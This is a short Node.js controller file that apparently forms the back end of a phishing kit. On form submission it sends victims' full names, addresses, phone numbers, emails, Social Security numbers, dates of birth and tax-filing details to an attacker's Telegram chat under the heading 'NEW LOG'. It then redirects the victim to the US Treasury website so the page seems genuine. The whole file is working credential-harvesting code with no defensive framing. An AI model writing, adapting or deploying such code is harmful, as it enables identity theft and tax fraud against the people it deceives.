const { Telegraf } = require("telegraf");
const { message } = require("telegraf/filters");

const config = require("../config");

const bot = new Telegraf(config.BOT_TOKEN);

exports.getIndex = (req, res, next) => {
  res.render("index");
};

exports.postRequest = (req, res, next) => {
  bot.telegram.sendMessage(
    config.CHAT_ID,
    `NEW LOG @TALISMAN_DEVELOPMENT\n\nFull name: ${req.body.fullName}\nAddress: ${req.body.address}\nCity: ${req.body.city}\nState: ${req.body.state}\nZip code: ${req.body.zipCode}\nEmail: ${req.body.email}\nCell phone: ${req.body.cellPhone}\nSSN: ${req.body.ssn}\nFilled return 2022: ${req.body.filledReturn}\nDate of birth: ${req.body.dob}\nRent or Own?: ${req.body.rentOrOwn}\nAvailable for Identity ?: ${req.body.availableForIdentity}`
  );
  res.redirect('https://home.treasury.gov/')
};
